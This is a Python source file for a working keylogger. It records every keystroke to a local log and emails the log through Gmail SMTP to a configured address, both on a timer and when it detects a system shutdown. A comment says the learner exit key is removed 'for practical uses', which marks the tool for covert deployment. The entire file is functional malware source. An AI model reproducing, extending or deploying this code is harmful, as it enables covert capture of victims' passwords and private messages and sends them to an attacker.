#for creating and sending mails
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

#To detect shutdown call from device and create threads
import os
import psutil
import threading
import time

#To detect keystrokes
from pynput import keyboard
from pynput.keyboard import Key

class KeyLogger:
    def __init__(self, email, password, interval):
        self.email = email
        self.password = password
        self.interval = interval
        self.stop_event = threading.Event()
        self.shutdown_detected = False
    
    #This function adds keystrokes to log.txt
    def on_press(self, key):
        cur_key = ''
        try:
            cur_key = str(key.char)
        except AttributeError:
            if key == Key.space:
                cur_key = ' '
            elif key == Key.enter:
                cur_key = '\n'
            elif key == Key.esc:
                #this option to exit by esc is given for learners to exit the program. 
                #for practical uses this elif condition is removed.
                print("Exiting program...")
                self.send_email()
                self.stop_event.set()
                return False
            elif key == Key.tab:
                cur_key = ' TAB '
            elif key == Key.shift:
                cur_key = ' SHIFT '
            elif key == Key.ctrl:
                cur_key = ' CTRL '
            elif key == Key.alt:
                cur_key = ' ALT '
            else:
                cur_key = f" {str(key)} "
        
        with open("log.txt", "a") as file:
            file.write(cur_key)
    
    def send_email(self):
        # Create the email message
        msg = MIMEMultipart()
        msg['From'] = self.email
        msg['To'] = self.email  # Send it to yourself (or specify any recipient)
        msg['Subject'] = "Keylogger Log File"

        # Add a message body
        body = "Here is the log file from the keylogger.\n"
        msg.attach(MIMEText(body, 'plain'))

        # Attach the log.txt file
        filename = "log.txt"
        try:
            with open(filename, "rb") as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f"attachment; filename={filename}")
                msg.attach(part)

            # Send the email
            server = smtplib.SMTP('smtp.gmail.com', 587)  # For Gmail, use smtp.gmail.com
            server.starttls()
            server.login(self.email, self.password)
            text = msg.as_string()
            server.sendmail(self.email, self.email, text)  # Send to yourself or another recipient
            server.quit()
            print("Log file sent successfully!")

            #clears the log file if it is sent successfully so as to not repeat it
            with open(filename,'r+') as file_clear:
                file_clear.truncate(0)
        except Exception as e:
            print(f"Error sending email: {e}")

    def report_n_send(self):
        if not self.stop_event.is_set():
            with open("log.txt", "a+") as file:
                file.seek(0)
                lines = file.readlines()
                if lines and len(lines[-1].strip()) > 150:  # Check if the last line exceeds 150 characters
                    file.write("\n")  # Add a new line to ensure readability
            
            # Start the timer again for checking the next line
            timer = threading.Timer(self.interval, self.report_n_send)
            timer.start()

    def detect_shutdown(self):
        #Detect shutdown event and sends the email when the system is shutting down.
        while not self.shutdown_detected:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] == 'shutdown.exe' or proc.info['name'] == 'poweroff.exe':
                    self.shutdown_detected = True
                    self.send_email()
                    self.stop_event.set()
                    break
            time.sleep(1)
    
    def start(self):
        # Start the listener to capture keystrokes
        listener = keyboard.Listener(on_press=self.on_press)
        with listener:
            # Start the shutdown detection and email sending process in a separate thread
            shutdown_thread = threading.Thread(target=self.detect_shutdown)
            shutdown_thread.daemon = True
            shutdown_thread.start()

            # Start the line-length checking in another thread
            self.report_n_send()
            
            listener.join()


# Email credentials and interval input
email = "your_email@example.com"
password = "your_email_password"
interval = 100

keylogger = KeyLogger(email, password, interval)
keylogger.start()